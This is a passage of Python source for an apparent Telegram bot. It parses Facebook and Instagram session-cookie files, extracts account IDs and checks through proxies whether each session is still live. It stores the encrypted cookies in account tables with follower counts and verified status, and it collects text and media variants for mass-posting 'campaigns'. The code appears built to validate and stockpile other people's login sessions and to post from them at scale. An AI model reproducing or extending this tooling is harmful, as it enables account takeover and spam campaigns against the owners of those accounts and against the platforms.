        # to DEAD claim nahi karte — proxy ka block page false DEAD deta hai.
        if any(r.get("Status") == "UNKNOWN" for r in results):
            return {
                "Status": "UNKNOWN",
                "Platform": platform_obj.NAME,
                "Reason": f"DEAD unconfirmed (proxy only): {combined}",
            }
        dead_result["Reason"] = combined
        return dead_result

    if final:
        # Dono routes UNKNOWN (network/proxy glitch) — thoda wait karke ek aur try
        if final.get("Status") == "UNKNOWN":
            delay = int(os.getenv("VERIFY_SLOW_RETRY_SEC", "5") or 0)
            if delay > 0:
                logger.info("verify: all routes UNKNOWN, slow retry in %ss", delay)
                await asyncio.sleep(delay)
                cl = None
                try:
                    cl = platform_obj.http_client()
                    retry = await platform_obj.live_check(cl, cookies)
                except Exception as e:  # noqa: BLE001
                    logger.warning(
                        "verify slow retry error: %s", mask_sensitive(str(e))
                    )
                    retry = None
                finally:
                    if cl is not None:
                        await cl.aclose()
                if retry:
                    retry["via"] = "direct-retry"
                    results.append(retry)
                    if retry.get("Status") in ("LIVE", "DEAD"):
                        return retry
                    final = retry

        if len(results) > 1:
            final["Reason"] = " | ".join(
                f"{r.get('via')}: {r.get('Status')}/{r.get('Reason', '')}" for r in results
            )
        return final

    return {
        "Status": "UNKNOWN",
        "Platform": platform_obj.NAME,
        "Reason": f"no route tried{f' ({last_error})' if last_error else ''}",
    }


async def _process_one(
    name: str,
    raw: str,
    state: dict,
    db_client: Optional[httpx.AsyncClient] = None,
) -> tuple:
    """Process a single cookie file."""
    bp = BasePlatform()
    cookie_data, cookie_lines = bp.parse_cookie_file(raw)
    meta = parse_meta(raw, name)

    if not cookie_lines:
        name_platform = _detect_platform_from_name(name) or "unknown"
        detail = (
            "NO COOKIES FOUND\n"
            f"File: {name}\n"
            f"Detected platform: {name_platform}\n"
            f"File size: {len(raw)} bytes\n\n"
            "--- first 500 chars ---\n"
            + (raw[:500] if raw else "(file empty)")
        )
        return (name, detail, "NOCOOKIES", {}, {})

    # Cookie keys are the strongest signal: a Facebook file must never be
    # checked with the Instagram verifier (that used to show false DEAD).
    platform, source, detect_reason = resolve_platform(
        name, cookie_data, state.get("platform")
    )
    if not platform:
        status = "UNKNOWN"
        meta.update({
            "Status": status,
            "Reason": f"platform detect nahi hua: {detect_reason}",
            "Platform": "unknown",
            "Checked": time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime()),
        })
        output = build_cookie_file(meta, cookie_lines)
        return (name, output, status, cookie_data, meta)

    platform_obj = get_platform(platform)

    # Session cookie me owner id hamesha hota hai (c_user / ds_user_id). HTML
    # se id na mile to bhi output/DB me ID fill ho jati hai.
    owner_id = str(
        cookie_data.get("c_user") or cookie_data.get("ds_user_id") or ""
    ).strip()
    if owner_id and not meta.get("ID"):
        meta["ID"] = owner_id

    # Live check if enabled — proxy + direct dono routes try hote hain
    want_live = bool(state.get("live")) or state.get("mode") == "verify"
    check: Dict[str, Any] = {}
    if want_live and platform_obj:
        check = await _verify_cookie(platform_obj, cookie_data, proxy=_pick_proxy())
        status = check.get("Status", "UNKNOWN")
        merge_check_meta(meta, check, platform)
    elif want_live:
        status = "UNKNOWN"
    else:
        status = "REWORKED"

    meta.update({
        "Status": status,
        "Reason": check.get("Reason", "" if want_live else "live check off (rework only)"),
        "Platform": platform,
        "Platform source": source,
        "Checked": time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime()),
    })
    if check.get("via"):
        meta["Via"] = str(check["via"])
    output = build_cookie_file(meta, cookie_lines)

    # Save every verified result (LIVE/DEAD/UNKNOWN) so /db stats and
    # /db reverify see reality. Rework-only runs (no live check) are not saved.
    if want_live and _db:
        table = "fb_accounts" if platform == "facebook" else "ig_accounts"
        norm = _norm_meta(meta)
        username = str(
            norm.get("Username", "") or norm.get("ID", "") or owner_id or ""
        ).strip()
        if not username:
            logger.warning("DB save skipped (no username/ID): %s", name)
        else:
            now = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
            row = {
                "username": username,
                "fb_id": str(norm.get("ID", "") or owner_id)
                if platform == "facebook" else "",
                "ig_id": str(norm.get("ID", "") or owner_id)
                if platform == "instagram" else "",
                "cookies": encrypt_cookies(cookie_data),
                "country": norm.get("Country", ""),
                "followers": _to_int(norm.get("Followers")),
                "verified": str(norm.get("Verified", "false")).lower() == "true",
                "status": status.lower(),
                "source": "verify",
                "last_check": now,
            }
            if status == "LIVE":
                row["last_ok"] = now
            try:
                if db_client is not None:
                    saved, db_err = await _db.upsert(db_client, table, [row])
                else:
                    async with httpx.AsyncClient(
                        timeout=httpx.Timeout(10.0)
                    ) as cl:
                        saved, db_err = await _db.upsert(cl, table, [row])
                if not saved:
                    logger.warning("DB save failed for %s (%s): %s", name, table, db_err)
            except Exception:  # noqa: BLE001
                logger.exception("DB save failed for %s", name)

    return (name, output, status, cookie_data, meta)


async def cancel_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not await _require_admin(update):
        return
    if not check_user_rate_limit(uid):
        await update.message.reply_text("Rate limit hit. Please wait before sending another command.")
        return
    stopped = False
    if uid in CAMPRUN:
        CAMPRUN[uid]["stop"] = True
        stopped = True
    user_state.pop(uid, None)
    cfg = CAMPS.get(uid)
    if cfg:
        cfg["stage"] = "idle"
        save_camp(uid)
    await update.message.reply_text(
        "Cancel / reset." + (" Campaign stop signal bhej diya." if stopped else "")
    )
    await audit_log(uid, "cancel", {"stopped_campaign": stopped})


async def on_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle text messages for campaign variant collection."""
    uid = update.effective_user.id
    if not _is_admin(uid):
        return
    if not check_content_rate_limit(uid):
        await update.message.reply_text("Thoda ruk kar dobara bhejo (flood protection).")
        return

    cfg = CAMPS.get(uid)
    state = user_state.get(uid, {})
    in_text_stage = (
        state.get("mode") == "campaign" and state.get("stage") == "text"
    ) or (cfg is not None and cfg.get("stage") == "text")

    if not in_text_stage:
        return

    if not cfg:
        await update.message.reply_text("Campaign not found. Use /camp new to create one.")
        return

    text = safe_text(update.message.text or "", max_len=4096)
    if not text:
        await update.message.reply_text("Empty text not allowed.")
        return

    cfg["texts"].append(text)
    save_camp(uid)
    await update.message.reply_text(
        f"Variant {len(cfg['texts'])} added: {safe_text(text, 80)}\n"
        "/camp idle se text mode band karo, /camp start se campaign shuru."
    )


async def on_media(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Collect campaign media (stored as Telegram file ids only)."""
    uid = update.effective_user.id
    if not _is_admin(uid):
        return
    cfg = CAMPS.get(uid)
    state = user_state.get(uid, {})
    if not cfg or not (
        (state.get("mode") == "campaign" and state.get("stage") == "media")
        or cfg.get("stage") == "media"
    ):
        return

    msg = update.message
    if msg.photo:
        entry = {"type": "photo", "file_id": msg.photo[-1].file_id}
    elif msg.video:
        entry = {"type": "video", "file_id": msg.video.file_id}
    else:
        return

    if len(cfg.get("media", [])) >= 50:
        await msg.reply_text(
            "Media limit 50 hai. /camp reset ya naya campaign use karo."
        )
        return
    cfg["media"].append(entry)
    save_camp(uid)
    await msg.reply_text(
        f"Media {len(cfg['media'])} added ({entry['type']}).\n"
        "Note: Graph API ko public URL chahiye hota hai; file_id se direct post "
        "nahi hota. URL ke liye /camp mediaurl https://... set karo."
    )